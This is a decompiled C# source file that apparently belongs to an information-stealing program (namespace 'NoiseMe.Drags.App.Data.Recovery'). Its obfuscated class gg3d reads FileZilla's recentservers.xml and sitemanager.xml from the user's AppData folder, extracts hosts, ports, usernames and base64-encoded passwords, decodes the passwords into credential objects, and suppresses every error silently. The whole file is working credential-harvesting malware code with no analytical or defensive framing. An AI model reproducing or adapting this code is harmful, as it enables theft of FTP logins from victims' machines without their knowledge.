using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x02000191 RID: 401
	public class gg3d : GH9kf<FtpCredential>
	{
		// Token: 0x06000CBD RID: 3261 RVA: 0x00027EE4 File Offset: 0x000260E4
		public List<FtpCredential> EnumerateData()
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				string path = string.Format("{0}\\FileZilla\\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				string path2 = string.Format("{0}\\FileZilla\\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				if (File.Exists(path))
				{
					list.AddRange(gg3d.FFFTp(path));
				}
				if (File.Exists(path2))
				{
					list.AddRange(gg3d.FFFTp(path2));
				}
				return list;
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CBE RID: 3262 RVA: 0x00027F60 File Offset: 0x00026160
		public static List<FtpCredential> FFFTp(string Path)
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					FtpCredential ftpCredential = gg3d.Rcnt((XmlNode)obj);
					if (ftpCredential.Username != "UNKNOWN" && ftpCredential.Server != "UNKNOWN")
					{
						list.Add(ftpCredential);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CBF RID: 3263 RVA: 0x00028020 File Offset: 0x00026220
		public static FtpCredential Rcnt(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = gg3d.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x06000CC0 RID: 3264 RVA: 0x00028020 File Offset: 0x00026220
		public static FtpCredential MngCred(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = gg3d.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x06000CC1 RID: 3265 RVA: 0x0002818C File Offset: 0x0002638C
		public static string Base64Decode(string input)
		{
			string result;
			try
			{
				byte[] bytes = Convert.FromBase64String(input);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = input;
			}
			return result;
		}
	}
}
